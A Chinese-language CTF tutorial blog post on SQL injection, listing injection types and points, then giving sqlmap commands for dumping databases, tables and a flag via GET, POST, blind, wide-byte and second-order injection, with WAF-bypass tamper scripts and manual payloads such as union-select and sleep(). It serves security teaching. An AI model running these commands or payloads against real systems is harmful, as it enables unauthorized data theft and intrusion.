---
title: SQL注入
date: 2025-11-15 20:53:26
tags:
index_img: https://pic1.imgdb.cn/item/69189f3e3203f7be000915ab.png
categories: CTF
---

### 一、SQL 注入基础


**核心原理**：用户输入未经过滤直接拼接到 SQL 语句中，导致恶意代码被执行。  

**CTF 常见注入类型**：

- **联合查询注入（UNION）**
- **布尔盲注**
- **时间盲注**
- **报错注入**
- **堆叠查询注入**
- **宽字节注入**
- **二次注入**

**常见注入点**

- **GET 参数**：`http://example.com/page.php?id=1`
- **POST 参数**：登录框、搜索框、留言板等表单提交的参数。
- **Cookie**：`Cookie: user=admin; session=abc123`
- **HTTP 头部**：`User-Agent`, `Referer`, `X-Forwarded-For` 等。



### 二、SQLmap 快速上手



####  关键参数说明

|参数|作用|
|---|---|
|`-u`|指定目标 URL|
|`-r`|加载 HTTP 请求文件（Burp 抓包保存为 `.txt`）|
|`-p`|指定测试的参数（如 `id`、`username`）|
|`--dbs`|列出所有数据库|
|`-D <db>`|指定数据库|
|`--tables`|列出指定数据库的所有表|
|`-T <table>`|指定表|
|`--columns`|列出指定表的所有字段|
|`-C <columns>`|指定字段（多个用逗号分隔）|
|`--dump`|导出指定字段的数据|
|`--current-db`|获取当前数据库名|
|`--current-user`|获取当前数据库用户|
|`--technique`|指定注入技术（如 `B` 布尔盲注，`T` 时间盲注，`U` 联合查询）|
|`--time-sec`|时间盲注时的延迟时间（默认 5 秒）|
|`--tamper`|使用脚本绕过 WAF（如 `space2comment` 替换空格为注释）|
|`--threads`|多线程（默认 1，CTF 中建议 1-5 避免触发防护）|


### 三、CTF 常见场景与 SQLmap 实操



#### 场景 1：GET 参数注入



**示例 URL**：`http://ctf.example.com/web1/?id=1`  



**操作流程**：



1. **检测注入点**：

    ```Bash
    python sqlmap.py -u "http://ctf.example.com/web1/?id=1"
    ```

2. **获取数据库**：

    ```Bash
    python sqlmap.py -u "http://ctf.example.com/web1/?id=1" --dbs
    ```

3. **获取表和字段**：

    ```Bash
    python sqlmap.py -u "http://ctf.example.com/web1/?id=1" -D ctf_db --tables
    python sqlmap.py -u "http://ctf.example.com/web1/?id=1" -D ctf_db -T flag --columns
    ```

4. **导出数据**：

    ```Bash
    python sqlmap.py -u "http://ctf.example.com/web1/?id=1" -D ctf_db -T flag -C flag --dump
    ```



#### 场景 2：POST 表单注入



**示例**：登录表单（`username` 和 `password` 参数）  

**操作流程**：

1. **Burp 抓包并保存为** **`request.txt`**：

    ```HTTP
    POST /login.php HTTP/1.1
    Host: ctf.example.com
    Content-Length: 31
    
    username=admin&password=123456
    ```

2. **SQLmap 检测**：

    ```Bash
    python sqlmap.py -r request.txt -p username  # 指定测试 username 参数
    ```

3. **后续操作同 GET 注入**：

    ```Bash
    python sqlmap.py -r request.txt -p username --dbs
    # ... 导出 flag
    ```



#### 场景 3：布尔盲注（无回显）



**特征**：页面无报错，仅根据输入返回“正常”或“异常”（如登录成功/失败）  

**操作流程**：

```Bash
# 指定布尔盲注技术
python sqlmap.py -r request.txt -p username --technique B --dbs
# 导出数据（较慢，耐心等待）
python sqlmap.py -r request.txt -p username -D ctf_db -T flag -C flag --dump
```



#### 场景 4：时间盲注（无回显）



**特征**：页面无任何差异，需通过响应时间判断  

**操作流程**：

```Bash
# 指定时间盲注技术，设置延迟 3 秒
python sqlmap.py -r request.txt -p username --technique T --time-sec 3 --dbs
# 导出数据（非常慢，可适当调大 threads）
python sqlmap.py -r request.txt -p username -D ctf_db -T flag -C flag --dump --threads 3
```



#### 场景 5：宽字节注入（GBK 编码）



**特征**：后端使用 `addslashes()` 或 `mysql_real_escape_string()` 过滤，但数据库为 GBK 编码  

**操作流程**：

```Bash
# 使用 tamper 脚本绕过
python sqlmap.py -u "http://ctf.example.com/web5/?id=1" --tamper=gbkencode --dbs
```



#### 场景 6：二次注入



**特征**：注入点不在初始输入，而在后续读取存储数据时触发（如注册用户名后登录）  

**操作流程**：

1. **注册恶意用户名**：`admin' --`  

2. **Burp 抓包登录请求并保存为 ** **`login.txt`**  

3. **SQLmap 检测登录请求中的 ** **`username`** ** 参数**：

    ```Bash
    python sqlmap.py -r login.txt -p username --dbs
    ```



### 四、CTF 技巧

1. **快速定位注入点**：

    - 先手动测试（如 `'`、`"`、`and 1=1`、`and 1=2`）判断是否存在注入。

    - 若手动难以判断，直接用 SQLmap 扫描。

2. **绕过 WAF**：

    - 使用 `--tamper` 脚本（常见：`space2comment`、`unionalltounion`、`randomcase`）。

    - 手动修改请求头（如 `X-Forwarded-For` 伪造 IP）。

3. **优化 SQLmap 速度**：

    - 时间盲注时减小 `--time-sec`（如 2 秒）。

    - 合理使用 `--threads`（1-5 为宜）。

    - 明确目标后直接指定数据库、表、字段，避免全量扫描。

4. **手动注入辅助**：

    - 当 SQLmap 无法自动化时，手动构造 payload：

        - 联合查询：`id=1' union select 1,2,database()--`

        - 布尔盲注：`id=1' and length(database())>5--`

        - 时间盲注：`id=1' and sleep(5)--`



